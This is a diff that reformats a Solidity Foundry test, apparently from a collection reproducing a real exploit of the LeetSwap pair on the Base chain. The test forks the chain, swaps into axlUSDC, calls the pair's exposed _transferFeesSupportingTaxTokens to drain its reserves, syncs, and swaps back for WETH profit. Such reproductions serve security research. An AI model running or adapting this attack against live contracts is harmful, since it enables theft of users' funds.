@@ -20,9 +20,9 @@ import "./interface.sol";
 // Hacking God : https://www.google.com/
 
 interface ILeetSwapPiar {
-     function _transferFeesSupportingTaxTokens(address token, uint256 amount) external returns (uint256);
-     
-     function sync()  external;
+    function _transferFeesSupportingTaxTokens(address token, uint256 amount) external returns (uint256);
+
+    function sync() external;
 }
 
 contract ContractTest is Test {
@@ -32,7 +32,7 @@ contract ContractTest is Test {
     ILeetSwapPiar Pair = ILeetSwapPiar(0x94dAC4a3Ce998143aa119c05460731dA80ad90cf);
 
     function setUp() public {
-        vm.createSelectFork("Base", 2031746);
+        vm.createSelectFork("Base", 2_031_746);
         vm.label(address(WETH), "WETH");
         vm.label(address(axlUSDC), "axlUSDC");
         vm.label(address(Router), "Router");
@@ -46,7 +46,9 @@ contract ContractTest is Test {
         path[0] = address(WETH);
         path[1] = address(axlUSDC);
 
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(0.001 ether, 0, path, address(this), block.timestamp);
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            0.001 ether, 0, path, address(this), block.timestamp
+        );
 
         Pair._transferFeesSupportingTaxTokens(address(axlUSDC), axlUSDC.balanceOf(address(Pair)) - 100);
         Pair.sync();
@@ -54,11 +56,12 @@ contract ContractTest is Test {
         axlUSDC.approve(address(Router), type(uint256).max);
         path[0] = address(axlUSDC);
         path[1] = address(WETH);
-        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(axlUSDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
+        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            axlUSDC.balanceOf(address(this)), 0, path, address(this), block.timestamp
+        );
 
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
-        );
-
+            );
     }
 }
